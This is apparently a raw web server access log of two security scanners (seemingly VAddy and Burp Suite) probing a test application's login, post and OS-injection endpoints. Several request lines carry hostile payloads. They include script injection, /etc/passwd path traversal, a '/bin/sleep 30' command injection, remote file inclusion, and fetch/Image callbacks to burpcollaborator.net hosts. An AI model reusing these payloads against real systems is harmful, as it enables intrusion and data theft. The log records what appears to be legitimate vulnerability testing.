52.69.45.235 - - [20/Dec/2019:08:02:05 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1684
203.141.138.55 - - [20/Dec/2019:08:02:05 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:05 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1753
203.141.138.55 - - [20/Dec/2019:08:02:06 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:06 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:06 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:06 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1951
203.141.138.55 - - [20/Dec/2019:08:02:07 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:07 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1653
203.141.138.55 - - [20/Dec/2019:08:02:07 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:07 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1651
203.141.138.55 - - [20/Dec/2019:08:02:07 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:07 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1804
52.69.45.235 - - [20/Dec/2019:08:02:08 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1684
203.141.138.55 - - [20/Dec/2019:08:02:08 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:08 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1753
203.141.138.55 - - [20/Dec/2019:08:02:08 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:08 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:09 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:09 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1951
203.141.138.55 - - [20/Dec/2019:08:02:09 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:09 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1653
203.141.138.55 - - [20/Dec/2019:08:02:09 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:10 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1651
203.141.138.55 - - [20/Dec/2019:08:02:10 +0000] "POST /vaddyTest/osInjection?75p3p2au5c=1 HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:10 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1804
203.141.138.55 - - [20/Dec/2019:08:02:10 +0000] "POST /vaddyTest/osInjection?%60z'z%22$%7b%7b%25%7b%7b%5c=1 HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:10 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1684
203.141.138.55 - - [20/Dec/2019:08:02:11 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:11 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1753
203.141.138.55 - - [20/Dec/2019:08:02:11 +0000] "POST /vaddyTest/osInjection?xmokkxu%5cz%60z'z%22$%7b%7b%25%7b%7b%5c=1 HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:11 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:12 +0000] "POST /vaddyTest/osInjection?nwmn%5cz%60z'z%22$%7b%7b%25%7b%7b%5c=1 HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:12 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1642
203.141.138.55 - - [20/Dec/2019:08:02:12 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:12 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1642
52.69.45.235 - - [20/Dec/2019:08:02:12 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1642
203.141.138.55 - - [20/Dec/2019:08:02:12 +0000] "POST /vaddyTest/osInjection?ksxx%5cz%60z'z%22$%7b%7b%25%7b%7b%5c=1 HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:13 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1642
203.141.138.55 - - [20/Dec/2019:08:02:13 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:13 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1642
203.141.138.55 - - [20/Dec/2019:08:02:13 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:13 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1642
203.141.138.55 - - [20/Dec/2019:08:02:13 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:14 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:14 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:14 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:14 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:15 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:02:15 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:15 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:15 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:02:15 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:16 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:16 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:16 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:16 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:16 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:02:17 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:17 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:02:17 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:17 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:17 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 400 993
52.69.45.235 - - [20/Dec/2019:08:02:18 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:18 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:18 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:02:18 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:18 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:18 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/osInjection?v2ww=609955993 HTTP/1.1" 500 4381
203.141.138.55 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/osInjection/y6j914/ HTTP/1.1" 404 974
203.141.138.55 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/osInjection?du56dwnnq9=1 HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:19 +0000] "GET /vaddyTest/osInjection HTTP/1.1" 405 1045
52.69.45.235 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/osInjection?qvp0grg5c6=1 HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/osInjection?y87t=1145825057 HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/osInjection;/onh4z4/ HTTP/1.1" 404 974
203.141.138.55 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:19 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:20 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:02:20 +0000] "POST /vaddyTest/osInjection?WvKQ=1390721264 HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:20 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:20 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:02:20 +0000] "POST /vaddyTest/osInjection?ruGU=1494003161 HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:20 +0000] "POST /vaddyTest/osInjection?fRmw=592979418 HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:21 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:21 +0000] "POST /vaddyTest/osInjection?NPMe=1561583895 HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:21 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:21 +0000] "POST /vaddyTest/osInjection?MQLT=11828507 HTTP/1.1" 500 4381
52.69.45.235 - - [20/Dec/2019:08:02:21 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:02:22 +0000] "POST /vaddyTest/osInjection?Tfky=655548569 HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:22 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:02:22 +0000] "POST /vaddyTest/osInjection?mSaZ=1711226865 HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:22 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:22 +0000] "POST /vaddyTest/osInjection?Z3gi=1498927352 HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:22 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:23 +0000] "POST /vaddyTest/osInjection?efvO=665263627 HTTP/1.1" 500 4381
52.69.45.235 - - [20/Dec/2019:08:02:23 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:02:23 +0000] "POST /vaddyTest/osInjection?brMt=1628542366 HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:23 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
52.69.45.235 - - [20/Dec/2019:08:02:24 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 400 993
52.69.45.235 - - [20/Dec/2019:08:02:25 +0000] "POST /vaddyTest%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2FXSSTOKEN%2Fvaddy.js%3E%3C%2Fscript%3E/confirmPost HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:02:25 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1121
52.69.45.235 - - [20/Dec/2019:08:02:25 +0000] "POST /vaddyTest/confirmPost%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2FXSSTOKEN%2Fvaddy.js%3E%3C%2Fscript%3E HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:02:25 +0000] "POST /vaddyTest%27/confirmPost HTTP/1.1" 404 1024
52.69.45.235 - - [20/Dec/2019:08:02:26 +0000] "POST /vaddyTest/confirmPost%27 HTTP/1.1" 404 974
52.69.45.235 - - [20/Dec/2019:08:02:26 +0000] "POST /vaddyTest%2F*%2F/confirmPost HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:02:26 +0000] "POST /vaddyTest/confirmPost%2F*%2F HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:02:27 +0000] "POST /..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd/confirmPost HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:02:27 +0000] "POST /vaddyTest/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:02:27 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1070
52.69.45.235 - - [20/Dec/2019:08:02:27 +0000] "POST /vaddyTest/confirmPost%3B%2Fbin%2Fsleep+30 HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:02:27 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:27 +0000] "POST /vaddyTest/confirmPost%3B%2Fbin%2Fsleep+30 HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:02:28 +0000] "POST /http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F/confirmPost HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:02:28 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:28 +0000] "POST /vaddyTest/http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:02:28 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:28 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1642
203.141.138.55 - - [20/Dec/2019:08:02:29 +0000] "POST /vaddyTest/osInjection?k0lwzdz9bq3cpiuieha0e5hn6ec70yoqgea11pq=1 HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:29 +0000] "POST /vaddyTest/addPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:29 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:29 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:02:29 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:30 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:02:30 +0000] "POST /vaddyTest/er9qq7q32ku6gclc5b1u5z8hx831rsfk78y0lq9f HTTP/1.1" 404 974
203.141.138.55 - - [20/Dec/2019:08:02:30 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:30 +0000] "POST /vaddyTest/addPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:30 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:30 +0000] "POST /vaddyTest/addPost HTTP/1.1" 400 993
52.69.45.235 - - [20/Dec/2019:08:02:31 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:02:31 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1136
203.141.138.55 - - [20/Dec/2019:08:02:31 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1239
52.69.45.235 - - [20/Dec/2019:08:02:31 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:02:31 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:32 +0000] "POST /vaddyTest/addPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:32 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:32 +0000] "POST /vaddyTest/addPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:32 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:32 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:02:33 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:33 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:02:33 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:33 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:33 +0000] "POST /vaddyTest/addPost HTTP/1.1" 400 993
52.69.45.235 - - [20/Dec/2019:08:02:34 +0000] "POST /vaddyTest/addPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:34 +0000] "POST /vaddyTest/osInjection?'%22%3e%3csvg%2fonload%3dfetch%60%2f%2f378f6w6si9avw111l0hjloo6dxjq7hv9lxfk68v%5c.burpcollaborator.net%60%3e=1 HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:34 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:34 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
52.69.45.235 - - [20/Dec/2019:08:02:35 +0000] "POST /vaddyTest/addPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:35 +0000] "POST /vaddyTest/osInjection?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fbixnh4h0thl379c9w8srwwzeo5uyip6hx5rsig7X%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:35 +0000] "POST /vaddyTest/addPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:35 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:36 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:02:36 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:36 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:02:36 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:02:36 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:36 +0000] "POST /vaddyTest/addPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:37 +0000] "POST /vaddyTest/'%22%3e%3csvg/onload%3dfetch%60//p5v14i4egv8hunznjmf5jamsbjhc53tvjjabx1lq%5c.burpcollaborator.net%60%3e HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:02:37 +0000] "POST /vaddyTest/addPost HTTP/1.1" 400 993
203.141.138.55 - - [20/Dec/2019:08:02:37 +0000] "POST /vaddyTest/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/azdmy3yzag22o8t8d79qdvgd54bxzonge45wsmgbX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1" 404 974
52.69.45.235 - - [20/Dec/2019:08:02:37 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:38 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
52.69.45.235 - - [20/Dec/2019:08:02:38 +0000] "POST /vaddyTest/addPost HTTP/1.1" 400 993
52.69.45.235 - - [20/Dec/2019:08:02:39 +0000] "POST /vaddyTest/addPost HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:40 +0000] "GET /vaddyTest/home HTTP/1.1" 200 63354
52.69.45.235 - - [20/Dec/2019:08:02:40 +0000] "POST /vaddyTest/addPost HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:41 +0000] "GET /vaddyTest/home HTTP/1.1" 200 64565
52.69.45.235 - - [20/Dec/2019:08:02:41 +0000] "POST /vaddyTest/addPost HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:42 +0000] "GET /vaddyTest/home HTTP/1.1" 200 65784
52.69.45.235 - - [20/Dec/2019:08:02:42 +0000] "POST /vaddyTest/addPost HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:42 +0000] "GET /vaddyTest/home HTTP/1.1" 200 67049
52.69.45.235 - - [20/Dec/2019:08:02:43 +0000] "POST /vaddyTest/addPost HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:43 +0000] "GET /vaddyTest/home HTTP/1.1" 200 68273
52.69.45.235 - - [20/Dec/2019:08:02:44 +0000] "POST /vaddyTest/addPost HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:44 +0000] "GET /vaddyTest/home HTTP/1.1" 200 69520
52.69.45.235 - - [20/Dec/2019:08:02:46 +0000] "POST /vaddyTest/addPost HTTP/1.1" 500 11007
52.69.45.235 - - [20/Dec/2019:08:02:46 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:46 +0000] "GET /vaddyTest/home HTTP/1.1" 200 69520
52.69.45.235 - - [20/Dec/2019:08:02:47 +0000] "POST /vaddyTest/addPost HTTP/1.1" 500 11007
52.69.45.235 - - [20/Dec/2019:08:02:47 +0000] "POST /vaddyTest/addPost HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:48 +0000] "GET /vaddyTest/home HTTP/1.1" 200 70737
52.69.45.235 - - [20/Dec/2019:08:02:48 +0000] "POST /vaddyTest/addPost HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:49 +0000] "GET /vaddyTest/home HTTP/1.1" 200 71950
52.69.45.235 - - [20/Dec/2019:08:02:49 +0000] "POST /vaddyTest/addPost HTTP/1.1" 500 11007
52.69.45.235 - - [20/Dec/2019:08:02:50 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:50 +0000] "GET /vaddyTest/home HTTP/1.1" 200 71950
52.69.45.235 - - [20/Dec/2019:08:02:51 +0000] "POST /vaddyTest/addPost HTTP/1.1" 500 11007
52.69.45.235 - - [20/Dec/2019:08:02:51 +0000] "POST /vaddyTest/addPost HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:51 +0000] "GET /vaddyTest/home HTTP/1.1" 200 73174
52.69.45.235 - - [20/Dec/2019:08:02:52 +0000] "POST /vaddyTest/addPost HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:52 +0000] "GET /vaddyTest/home HTTP/1.1" 200 74428
52.69.45.235 - - [20/Dec/2019:08:02:53 +0000] "POST /vaddyTest/addPost HTTP/1.1" 500 11034
52.69.45.235 - - [20/Dec/2019:08:02:54 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:54 +0000] "GET /vaddyTest/home HTTP/1.1" 200 74428
52.69.45.235 - - [20/Dec/2019:08:02:55 +0000] "POST /vaddyTest/addPost HTTP/1.1" 500 11034
52.69.45.235 - - [20/Dec/2019:08:02:55 +0000] "POST /vaddyTest/addPost HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:55 +0000] "GET /vaddyTest/home HTTP/1.1" 200 75644
52.69.45.235 - - [20/Dec/2019:08:02:56 +0000] "POST /vaddyTest/addPost HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:56 +0000] "GET /vaddyTest/home HTTP/1.1" 200 76857
52.69.45.235 - - [20/Dec/2019:08:02:57 +0000] "POST /vaddyTest/addPost HTTP/1.1" 500 10716
52.69.45.235 - - [20/Dec/2019:08:02:57 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:58 +0000] "GET /vaddyTest/home HTTP/1.1" 200 76857
52.69.45.235 - - [20/Dec/2019:08:02:58 +0000] "POST /vaddyTest/addPost HTTP/1.1" 500 10716
52.69.45.235 - - [20/Dec/2019:08:02:59 +0000] "POST /vaddyTest/addPost HTTP/1.1" 500 10716
52.69.45.235 - - [20/Dec/2019:08:02:59 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:02:59 +0000] "GET /vaddyTest/home HTTP/1.1" 200 76857
52.69.45.235 - - [20/Dec/2019:08:03:00 +0000] "POST /vaddyTest/addPost HTTP/1.1" 500 10716
52.69.45.235 - - [20/Dec/2019:08:03:00 +0000] "POST /vaddyTest/addPost HTTP/1.1" 500 10716
52.69.45.235 - - [20/Dec/2019:08:03:00 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:03:01 +0000] "GET /vaddyTest/home HTTP/1.1" 200 76857
52.69.45.235 - - [20/Dec/2019:08:03:01 +0000] "POST /vaddyTest/addPost HTTP/1.1" 500 10716
52.69.45.235 - - [20/Dec/2019:08:03:02 +0000] "POST /vaddyTest%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2FXSSTOKEN%2Fvaddy.js%3E%3C%2Fscript%3E/addPost HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:03 +0000] "POST /vaddyTest/addPost%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2FXSSTOKEN%2Fvaddy.js%3E%3C%2Fscript%3E HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:03 +0000] "POST /vaddyTest%27/addPost HTTP/1.1" 404 1016
52.69.45.235 - - [20/Dec/2019:08:03:03 +0000] "POST /vaddyTest/addPost%27 HTTP/1.1" 404 974
52.69.45.235 - - [20/Dec/2019:08:03:04 +0000] "POST /vaddyTest%2F*%2F/addPost HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:04 +0000] "POST /vaddyTest/addPost%2F*%2F HTTP/1.1" 400 -
